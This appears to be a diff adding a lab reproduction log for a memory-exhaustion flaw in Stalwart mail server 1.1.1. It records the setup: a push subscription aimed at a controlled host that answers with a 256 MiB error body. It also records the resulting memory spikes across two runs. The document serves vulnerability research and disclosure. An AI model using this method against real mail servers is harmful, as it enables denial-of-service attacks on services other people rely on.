@@ -1,0 +1,19 @@
+# F2 on Stalwart 1.1.1 (container sw3 = stalwartlabs/stalwart:v1.1.1, digest sha256:5ebdf474b237..., stock binary)
+# lab: docker network pushnet 11.22.33.0/24; host runs F2_push_target.py on 11.22.33.1:443 with a lab CA installed in the container; --add-host push.lab-review.net:11.22.33.1
+# in-container pre-check: curl POST https://push.lab-review.net/selftest -> HTTP 500, 268435456 bytes in 0.46s
+# PushSubscription/set as user1 with url https://push.lab-review.net/push, types [Mailbox] -> created id b
+# push target log:
+15:07:50 POST /push from 11.22.33.2 req_len=107 -> 500 with 268435456 bytes
+15:07:51 sent 268435456 bytes
+# RSS of PID 1 (VmRSS, sampled every 0.25 s):
+baseline 15:07:49.328 95492 kB
+peak     15:07:51.612 513504 kB
+final    15:08:31.446 187536 kB
+# VERDICT: VULNERABLE on 1.1.1 (+418 MB peak from one 256 MiB non-2xx body; settles +92 MB)
+# run 2 (user2, same target, new subscription):
+15:10:00 POST /push from 11.22.33.2 req_len=107 -> 500 with 268435456 bytes
+15:10:01 sent 268435456 bytes
+baseline 15:09:59.833 130812 kB
+peak     15:10:01.563 689128 kB
+final    15:10:41.520 300180 kB
+# run 2: +558 MB peak, settles +169 MB above its own baseline; repeatable per subscription/verification request
